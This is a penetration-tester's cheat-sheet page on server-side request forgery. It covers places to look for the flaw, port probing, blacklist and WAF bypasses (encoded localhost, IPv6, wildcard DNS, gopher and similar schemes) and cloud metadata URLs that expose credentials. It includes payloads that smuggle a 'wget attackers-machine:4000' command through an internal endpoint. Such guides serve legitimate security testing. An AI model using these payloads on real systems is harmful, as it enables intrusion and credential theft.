---
description: Server Side Request Forgery
---

# SSRF

SSRF comes in many forms, each time I read a report is like its own unique occurrence, dependent on the web app's functionality and implementation.  SSRF  gives the user the ability to do something, though it  unintentionally gives the attacker the ability to make the request on behalf of the server. 

**PLACES TO FIND SSRF**

Perhaps most commonly, SSRF can be found via any parameter that  appears to be doing something as the server, such as fetching a website's content with a `url=` parameter \(especially if it's not used as a redirect\).  Some other places to find it are situations where a server makes requests to an API, some port or service on its internal network or fetches a file not normally exposed to the public internet.

**Quick SSRF tests and attacks**

Scan internal systems:  
`10.0.0.0/8   
127.0.0.1/32   
172.16.0.0/12   
192.168.0.0/16`  
  
**Reflected XSS:**  
Once you find an endpoint that is fetching an internal file, you can attempt to pull an external file to get a reflected XSS.  
`http://vulnsite/?url=http://brutelogic.com.br/poc.svg`  
  
**File upload services:**   
instead of uploading a file, try sending a URL and see if it downloads the content of your payload.

**ON FINDING INTERNAL PORTS**

If you receive an error message back, check to see if there's a way to tell the difference between open and closed ports. If the result is not completely obvious, look into subtler methods to find differences.  

For example, differences in response times may give you a hint, done very easily with Burp's intruder.  You can compare the amount of time it takes between a port that you are confident is open and contrast it - or just scan all 65,535 like a raging juggernaut \(as 99% of them will not be open, it should be pretty clear at this point\).  Though I'd recommend primarily scanning the ports most likely to be open, such as _80, 443, 8080, 8443, 8001, 22, etc.._

SMUGGLING FORGED REQUESTS UNDER THE WAF's NOSE

There are many tricks to try to bypass a web app's blacklists, whitelists, WAFs and IDSs, and many more continue to be developed through research such as Orange Tsai's and Nahamsec's, as well as many new vulnerable technologies creating new opportunities as well.

*  If you have an endpoint that appends a path to your payload, try adding a & or a \# to the end of your payload like so:

[`http://internal-vulnerable-server/rce?cmd=wget attackers-machine:4000&`](http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000&)[`http://internal-vulnerable-server/rce?cmd=wget attackers-machine:4000#`](http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000#)

* Take a look into a web app's PDF generators, document parsers and file uploads, as SSRF may occur there.  You can simplify the confirmation of the vulnerability without exposing your private IP by using burp collaborator or online webhooks \(https://webhook.site\).  

**Masking your internal requests**

Usually, requests to expose "localhost" and "127.0.0.1" are blacklisted.  Here's some bypasses, many of which can be combined to expand this list further.

```text
http://0177.1/
```

```text
http://0x7f.1/
```

```text
http://127.000.000.1
```

```text
https://520968996
```

_Note:_ The latter can be calculated using [http://www.subnetmask.info/](http://www.subnetmask.info/)

**Exotic Handlers**  
to bypass restrictions on "file://"

![Basic attempts such as above will likely be slapped down](../.gitbook/assets/image%20%2816%29.png)

```text
gopher://, dict://, php://, jar://, tftp://
```

**IPv6**

```text
http://[::1]
```

```text
http://[::]
```

**Wildcard DNS**

```text
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```

_Link:_ [http://xip.io](http://xip.io)

```text
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

_Link:_ [http://nip.io](http://nip.io)

**AWS EC2 Metadata**

```text
http://169.254.169.254/latest/meta-data/
```

```text
http://169.254.169.254/latest/meta-data/local-hostname
```

```text
http://169.254.169.254/latest/meta-data/public-hostname
```

> If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role \[...\]

_Link:_ [http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) \(includes a comprehensive Instance Metadata Categories table\)  


**Other services:**

★ Alibaba: [http://100.100.100.200/latest/meta-data/](http://100.100.100.200/latest/meta-data/)  
★ Docker - containers: [http://127.0.0.1:2375/v1.24/containers/json](http://127.0.0.1:2375/v1.24/containers/json)   
★ Kubernetes ETCD - contains API keys, internal ip and ports: [http://127.0.0.1:2379/v2/keys/?recursive=true](http://127.0.0.1:2379/v2/keys/?recursive=true)   
★ Google Cloud: [http://169.254.169.254/computeMetadata/v1/](http://169.254.169.254/computeMetadata/v1/)   
★ Digital Ocean: [http://169.254.169.254/metadata/v1.json](http://169.254.169.254/metadata/v1.json)   
★ Packetcloud: [https://metadata.packet.net/userdata](https://metadata.packet.net/userdata)   
★ Oracle Cloud: [http://192.0.0.192/latest/](http://192.0.0.192/latest/) 

**Whitelists**  
If dealing with a whitelist blocking your every attempt, the only way \(that I know of\) finding a bypass and making it appear as though the request is truly coming from within, is to find an open redirect from elsewhere in the webapp and diverting the request through it.

This has a great write-up on SOP and CORS, as well as SSRF: _https://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/_ 

**Bug Bounty Write-ups:**   
[https://hackerone.com/reports/508459](https://hackerone.com/reports/508459)  
[https://hackerone.com/reports/541169](https://hackerone.com/reports/541169)   
[https://hackerone.com/reports/115748](https://hackerone.com/reports/115748)   
[https://hackerone.com/reports/301924](https://hackerone.com/reports/301924)   
[https://www.sxcurity.pro/hackertarget/](https://www.sxcurity.pro/hackertarget/)   
[http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)   
[https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf](https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf) [https://github.com/ngalongc/bug-bounty-reference\#server-side-request-forgery-ssrf](https://github.com/ngalongc/bug-bounty-reference#server-side-request-forgery-ssrf) [https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/](https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/) 

**Payloads:** [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF) injection 

**RESOURCES**   
[http://resources.infosecinstitute.com/the-ssrf-vulnerability/\#gref](http://resources.infosecinstitute.com/the-ssrf-vulnerability/#gref) [http://blog.safebuff.com/2016/07/03/SSRF-Tips/](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)   
https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b   
[https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF) [https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/) [https://securingtomorrow.mcafee.com/mcafee-labs/server-side-request-forgery-takes-advantage-vulnerable-app-servers/](https://securingtomorrow.mcafee.com/mcafee-labs/server-side-request-forgery-takes-advantage-vulnerable-app-servers/) [https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/](https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/)

